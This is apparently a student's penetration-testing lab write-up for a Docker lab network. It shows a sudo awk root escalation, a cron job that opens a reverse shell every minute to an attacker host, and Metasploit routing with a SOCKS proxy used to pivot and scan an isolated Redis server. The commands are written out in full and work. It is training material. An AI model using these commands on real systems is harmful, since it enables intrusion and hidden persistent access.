# 💥 Operation Deep Pivot — TLAB 8

**Course:** Cybersecurity Operations | Week 8  
**Lab Type:** Penetration Testing / Red Team Operations  
**Environment:** Kali Linux VM + Docker-based multi-tier target network  
**Tools Used:** Metasploit Framework, GTFOBins, Proxychains, Nmap, Docker

---

## 🧭 Scenario

TitanCorp intelligence confirmed that CloudNano's most sensitive acquisition data resides on an air-gapped database — completely unreachable from the outside. With one compromised entry point, the mission was to escalate privileges, establish persistent access, and tunnel through the network to reach the hidden vault.

---

## 🏗️ Lab Architecture

```
[ Kali Attacker ]
       |
       | SSH (172.60.0.0/24 - dmz_net)
       v
[ Bastion Web Server ]  ←── 172.60.0.10
  (mercenary → root)
       |
       | Pivot (10.0.10.0/24 - vault_net - internal/air-gapped)
       v
[ Vault Database ]  ←── 10.0.10.50 (Redis :6379)
```

The bastion sat in an exposed DMZ network. The vault database was isolated on an internal network with no external routing — reachable only by pivoting through the bastion.

---

## ⚙️ Phase 1 — Beachhead & Privilege Escalation

**Objective:** Escalate from low-privilege user to root on the bastion.

**Steps:**
1. SSH into the bastion using compromised credentials (`mercenary:titan123`)
2. Ran `sudo -l` to enumerate allowed sudo commands
3. Discovered `/usr/bin/awk` was permitted with `NOPASSWD`
4. Used the [GTFOBins](https://gtfobins.github.io/gtfobins/awk/#sudo) sudo bypass for `awk`

**Exploit Command:**
```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

**Result:** Full root shell on the bastion (`whoami` → `root`)

**Key Concept:** Misconfigured `sudoers` entries on common Unix utilities (`awk`, `vim`, `find`, etc.) are a frequent real-world privilege escalation vector. GTFOBins catalogs these bypasses comprehensively.

---

## ⚙️ Phase 2 — Persistence

**Objective:** Guarantee continued access even if the initial session is lost.

**Steps:**
1. Installed `cron` and `nano` on the bastion (minimal Docker image lacked them)
2. Added a reverse shell cron job running every minute

**Cron Entry:**
```
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/172.60.0.1/4444 0>&1'
```

**Key Concept:** Cron-based persistence is a classic red team technique. A recurring reverse shell ensures the attacker maintains a callback channel without relying on a single session remaining open.

---

## ⚙️ Phase 3 — The Pivot (Lateral Movement)

**Objective:** Route traffic through the compromised bastion to reach the air-gapped vault database.

**Steps:**

1. **Established a Metasploit session** via SSH login scanner:
```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 172.60.0.10
set USERNAME mercenary
set PASSWORD titan123
run
```

2. **Added a route** to the hidden internal subnet through the session:
```
route add 10.0.10.0/24 1
```

3. **Started a SOCKS proxy** to tunnel arbitrary traffic:
```
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 4a
run
```

4. **Scanned the vault** through the tunnel using Proxychains + Nmap:
```bash
proxychains nmap -sT -Pn -p- 10.0.10.50
```

**Result:**
```
PORT     STATE SERVICE
6379/tcp open  redis
```

**Key Concept:** Pivoting allows an attacker to use a compromised host as a relay into otherwise unreachable network segments. SOCKS proxying with Metasploit routes + Proxychains is a standard technique for multi-tier network penetration.

---

## 🛠️ Technical Challenges & Troubleshooting

| Issue | Root Cause | Fix |
|---|---|---|
| `No route to host` on SSH | Bastion container never built | Manually rebuilt Docker image |
| Docker build failure | `awk` is a virtual package in Ubuntu 18.04 | Used `gawk` instead |
| `crontab: command not found` | Minimal Docker image lacked cron | `apt-get install -y cron` |
| `run autoroute` failed in shell session | `autoroute` requires Meterpreter, not a shell session | Used `route add` directly in msfconsole |
| `msfconsole` PostgreSQL segfault | Known gem conflict | Used `msfconsole -n` flag |

---

## 📸 Key Outputs

- ✅ Root shell confirmed via `whoami`
- ✅ Cron persistence entry verified via `crontab -l`
- ✅ Metasploit session opened on bastion (`Session 1 opened`)
- ✅ Route to `10.0.10.0/24` added through session
- ✅ SOCKS proxy running on port `1080`
- ✅ Vault database discovered at `10.0.10.50:6379` (Redis) via Proxychains Nmap

---

## 📚 Concepts Demonstrated

- **Privilege Escalation** via misconfigured sudoers + GTFOBins
- **Persistence** via cron reverse shell
- **Network Pivoting** using Metasploit routing + SOCKS proxy
- **Tunneled Scanning** using Proxychains + Nmap through a compromised host
- **Multi-tier Network Penetration** across segmented Docker networks
- **Docker-based lab environment** provisioning and troubleshooting

---

## 🔗 References

- [GTFOBins - awk](https://gtfobins.github.io/gtfobins/awk/)
- [Metasploit Unleashed - Pivoting](https://www.offensive-security.com/metasploit-unleashed/pivoting/)
- [Proxychains Documentation](https://github.com/haad/proxychains)
- [Redis Security](https://redis.io/docs/management/security/)
